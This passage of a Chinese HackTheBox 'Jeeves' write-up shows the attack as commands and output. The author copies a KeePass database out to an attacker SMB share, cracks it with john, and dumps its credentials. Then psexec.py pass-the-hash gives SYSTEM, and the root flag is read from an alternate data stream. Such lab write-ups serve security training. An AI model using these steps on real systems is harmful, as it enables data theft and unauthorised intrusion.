class="hljs-title">LastWriteTime</span>         <span class="hljs-title">Length</span> <span class="hljs-title">Name</span>                                                                  </span><br><span class="hljs-function">----                -------------         ------ ----                                                                  </span><br><span class="hljs-function">-<span class="hljs-title">ar</span>---        11/3/2017  11:22 <span class="hljs-title">PM</span>             32 <span class="hljs-title">user.txt</span>                                                              </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">cat</span> <span class="hljs-title">user.txt</span></span><br><span class="hljs-function"><span class="hljs-title">e323</span>.....................................</span><br></code></pre></td></tr></table></figure>
+
+<p>或许可以考虑土豆提权：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bat">PS C:\Users\kohsuke\Desktop&gt; whoami /all<br><br>USER INFORMATION<br>----------------<br><br>User Name      SID                                        <br>============== ===========================================<br>jeeves\kohsuke S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2851396806</span>-<span class="hljs-number">8246019</span>-<span class="hljs-number">2289784878</span>-<span class="hljs-number">1001</span><br><br><br>GROUP INFORMATION<br>-----------------<br><br>Group Name                           <span class="hljs-built_in">Type</span>             SID          Attributes                                        <br>==================================== ================ ============ ==================================================<br>Everyone                             Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>      Mandatory group, Enabled by default, Enabled group<br>BUILTIN\Users                        Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span> Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\SERVICE                 Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">6</span>      Mandatory group, Enabled by default, Enabled group<br>CONSOLE LOGON                        Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">2</span>-<span class="hljs-number">1</span>      Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\Authenticated Users     Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">11</span>     Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\This Organization       Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">15</span>     Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\Local account           Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">113</span>    Mandatory group, Enabled by default, Enabled group<br>LOCAL                                Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>      Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\NTLM Authentication     Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">64</span>-<span class="hljs-number">10</span>  Mandatory group, Enabled by default, Enabled group<br><span class="hljs-function">Mandatory Label\<span class="hljs-title">High</span> <span class="hljs-title">Mandatory</span> <span class="hljs-title">Level</span> <span class="hljs-title">Label</span>            <span class="hljs-title">S</span>-1-16-12288                                                   </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">PRIVILEGES</span> <span class="hljs-title">INFORMATION</span></span><br><span class="hljs-function">----------------------</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Privilege</span> <span class="hljs-title">Name</span>                <span class="hljs-title">Description</span>                               <span class="hljs-title">State</span>   </span><br><span class="hljs-function">============================= ========================================= ========</span><br><span class="hljs-function"><span class="hljs-title">SeShutdownPrivilege</span>           <span class="hljs-title">Shut</span> <span class="hljs-title">down</span> <span class="hljs-title">the</span> <span class="hljs-title">system</span>                      <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"><span class="hljs-title">SeChangeNotifyPrivilege</span>       <span class="hljs-title">Bypass</span> <span class="hljs-title">traverse</span> <span class="hljs-title">checking</span>                  <span class="hljs-title">Enabled</span> </span><br><span class="hljs-function"><span class="hljs-title">SeUndockPrivilege</span>             <span class="hljs-title">Remove</span> <span class="hljs-title">computer</span> <span class="hljs-title">from</span> <span class="hljs-title">docking</span> <span class="hljs-title">station</span>      <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"><span class="hljs-title">SeImpersonatePrivilege</span>        <span class="hljs-title">Impersonate</span> <span class="hljs-title">a</span> <span class="hljs-title">client</span> <span class="hljs-title">after</span> <span class="hljs-title">authentication</span> <span class="hljs-title">Enabled</span> </span><br><span class="hljs-function"><span class="hljs-title">SeCreateGlobalPrivilege</span>       <span class="hljs-title">Create</span> <span class="hljs-title">global</span> <span class="hljs-title">objects</span>                     <span class="hljs-title">Enabled</span> </span><br><span class="hljs-function"><span class="hljs-title">SeIncreaseWorkingSetPrivilege</span> <span class="hljs-title">Increase</span> <span class="hljs-title">a</span> <span class="hljs-title">process</span> <span class="hljs-title">working</span> <span class="hljs-title">set</span>            <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"><span class="hljs-title">SeTimeZonePrivilege</span>           <span class="hljs-title">Change</span> <span class="hljs-title">the</span> <span class="hljs-title">time</span> <span class="hljs-title">zone</span>                      <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">cmd</span></span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.10586]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2015 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">cmd.exe</span></span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.10586]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2015 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; </span><br></code></pre></td></tr></table></figure>
+
+<p>但目标系统似乎运行不了exe。在Document下有个奇怪的文件：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Mode                LastWriteTime         Length Name                                                                  <br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                                                  <br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">10</span>:<span class="hljs-number">51</span> PM                .groovy                                                               <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Contacts                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">19</span> PM                Desktop                                                               <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">18</span> PM                Documents                                                             <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Downloads                                                             <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Favorites                                                             <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">22</span> PM                Links                                                                 <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Music                                                                 <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">22</span> PM                OneDrive                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">3</span>:<span class="hljs-number">10</span> AM                Pictures                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Saved Games                                                           <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">16</span> PM                Searches                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Videos                                                                <br><br><br><span class="hljs-built_in">cd</span> Documents <br><span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\kohsuke\Documents<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                                                  <br><span class="hljs-literal">-a----</span>        <span class="hljs-number">9</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">1</span>:<span class="hljs-number">43</span> PM           <span class="hljs-number">2846</span> CEH.kdbx                                                              <br><br><br><span class="hljs-built_in">copy</span> .\CEH.kdbx \\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.2</span>\share\<br><span class="hljs-built_in">PS</span> C:\Users\kohsuke\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p>尝试破解其中密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ keepass2john CEH.kdbx<br>CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ keepass2john CEH.kdbx&gt;CEHhash<br>Crazy:~/HackTheBox$ john CEHhash -w=/usr/share/wordlists/rockyou.txt <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (KeePass [SHA256 AES 32/64])<br>Cost 1 (iteration count) is 6000 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (version) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>moonshine1       (CEH)     <br>1g 0:00:00:32 DONE (2022-08-29 23:32) 0.03052g/s 1678p/s 1678c/s 1678C/s nick18..moonshine1<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>这个软件是我第一次遇到，根据帮助文档，列出所有密码表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ kpcli --kdb CEH.kdbx                            <br>Provide the master password: *************************<br><br>KeePass CLI (kpcli) v3.7 is ready <span class="hljs-keyword">for</span> operation.<br>Type <span class="hljs-string">&#x27;help&#x27;</span> <span class="hljs-keyword">for</span> a description of available commands.<br>Type <span class="hljs-string">&#x27;help &lt;command&gt;&#x27;</span> <span class="hljs-keyword">for</span> details on individual commands.<br><br>kpcli:/&gt; find .<br>Searching <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;.&quot;</span> ...<br> - 8 matches found and placed into /_found/<br>Would you like to list them now? [y/N] <br>=== Entries ===<br>0. Backup stuff                                                           <br>1. Bank of America                                   www.bankofamerica.com<br>2. DC Recovery PW                                                         <br>3. EC-Council                               www.eccouncil.org/programs/cer<br>4. It<span class="hljs-string">&#x27;s a secret                                 localhost:8180/secret.jsp</span><br><span class="hljs-string">5. Jenkins admin                                            localhost:8080</span><br><span class="hljs-string">6. Keys to the kingdom                                                    </span><br><span class="hljs-string">7. Walmart.com                                             www.walmart.com</span><br><span class="hljs-string">kpcli:/&gt; </span><br></code></pre></td></tr></table></figure>
+
+<p>可以制定序号去查看每一条密码：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">kpcli:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 0</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">Backup</span> <span class="hljs-title">stuff</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: ?</span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span></span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: </span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 1</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">Bank</span> <span class="hljs-title">of</span> <span class="hljs-title">America</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">Michael321</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: 12345</span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: <span class="hljs-title">https</span>://<span class="hljs-title">www.bankofamerica.com</span></span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 2</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">DC</span> <span class="hljs-title">Recovery</span> <span class="hljs-title">PW</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">administrator</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">S1TjAtJHKsugh9oC4VZl</span></span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: </span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 3</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">EC</span>-<span class="hljs-title">Council</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">hackerman123</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">pwndyouall</span>!</span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: <span class="hljs-title">https</span>://<span class="hljs-title">www.eccouncil.org</span>/<span class="hljs-title">programs</span>/<span class="hljs-title">certified</span>-<span class="hljs-title">ethical</span>-<span class="hljs-title">hacker</span>-<span class="hljs-title">ceh</span></span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: <span class="hljs-title">Personal</span> <span class="hljs-title">login</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">kpcli</span>:/&gt; <span class="hljs-title">show</span> -<span class="hljs-title">f</span> 4</span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Path</span>: /<span class="hljs-title">CEH</span>/</span><br><span class="hljs-function"><span class="hljs-title">Title</span>: <span class="hljs-title">It</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">a</span> <span class="hljs-title">secret</span></span><br><span class="hljs-function"><span class="hljs-title">Uname</span>: <span class="hljs-title">admin</span></span><br><span class="hljs-function"> <span class="hljs-title">Pass</span>: <span class="hljs-title">F7WhTrSFDKB6sxHU1cUn</span></span><br><span class="hljs-function">  <span class="hljs-title">URL</span>: <span class="hljs-title">http</span>://<span class="hljs-title">localhost</span>:8180/<span class="hljs-title">secret.jsp</span></span><br><span class="hljs-function"><span class="hljs-title">Notes</span>: </span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>
+
+<p>序列号0看起来像是一条hash:</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">Crazy:~/<span class="hljs-title">HackTheBox</span>$ <span class="hljs-title">psexec.py</span> -<span class="hljs-title">hashes</span> <span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span> <span class="hljs-title">administrator</span>@10.10.10.63 <span class="hljs-title">cmd.exe</span></span><br><span class="hljs-function"><span class="hljs-title">Impacket</span> <span class="hljs-title">v0</span>.10.1.<span class="hljs-title">dev1</span>+20220720.103933.3<span class="hljs-title">c6713e3</span> - <span class="hljs-title">Copyright</span> 2022 <span class="hljs-title">SecureAuth</span> <span class="hljs-title">Corporation</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">[*] <span class="hljs-title">Requesting</span> <span class="hljs-title">shares</span> <span class="hljs-title">on</span> 10.10.10.63.....</span><br><span class="hljs-function">[*] <span class="hljs-title">Found</span> <span class="hljs-title">writable</span> <span class="hljs-title">share</span> <span class="hljs-title">ADMIN</span>$</span><br><span class="hljs-function">[*] <span class="hljs-title">Uploading</span> <span class="hljs-title">file</span> <span class="hljs-title">GXOdPUzo.exe</span></span><br><span class="hljs-function">[*] <span class="hljs-title">Opening</span> <span class="hljs-title">SVCManager</span> <span class="hljs-title">on</span> 10.10.10.63.....</span><br><span class="hljs-function">[*] <span class="hljs-title">Creating</span> <span class="hljs-title">service</span> <span class="hljs-title">WXKS</span> <span class="hljs-title">on</span> 10.10.10.63.....</span><br><span class="hljs-function">[*] <span class="hljs-title">Starting</span> <span class="hljs-title">service</span> <span class="hljs-title">WXKS</span>.....</span><br><span class="hljs-function">[!] <span class="hljs-title">Press</span> <span class="hljs-title">help</span> <span class="hljs-title">for</span> <span class="hljs-title">extra</span> <span class="hljs-title">shell</span> <span class="hljs-title">commands</span></span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.10586]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2015 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt; <span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">nt</span> <span class="hljs-title">authority</span>\<span class="hljs-title">system</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt; </span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is BE50-B1C9<br><br> Directory of C:\Users\Administrator\Desktop<br><br>11/08/2017  10:05 AM    &lt;DIR&gt;          .<br>11/08/2017  10:05 AM    &lt;DIR&gt;          ..<br>12/24/2017  03:51 AM                36 hm.txt<br>11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk<br>               2 File(s)            833 bytes<br>               2 Dir(s)   7,478,935,552 bytes free<br><br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> hm.txt<br>The flag is elsewhere.  Look deeper.<br>C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">dir</span> /R<br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is BE50-B1C9<br><br> Directory of C:\Users\Administrator\Desktop<br><br>11/08/2017  10:05 AM    &lt;DIR&gt;          .<br>11/08/2017  10:05 AM    &lt;DIR&gt;          ..<br>12/24/2017  03:51 AM                36 hm.txt<br>                                    34 hm.txt:root.txt:<span class="hljs-variable">$DATA</span><br>11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk<br>               2 File(s)            833 bytes<br>               2 Dir(s)   7,478,935,552 bytes free<br><br>C:\Users\Administrator\Desktop&gt; more &lt; hm.txt:root.txt      <br>afbc.....................................<br><br>C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Windows/">#Windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Jeeves</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Jeeves/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>CrazyInSide</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Insider/" title="HackTheBox-Insider">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Insider</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Markup/" title="HackTheBox-Markup">
+                        <span class="hidden-mobile">HackTheBox-Markup</span>
+                        <span class="visible-mobile">Next</span>
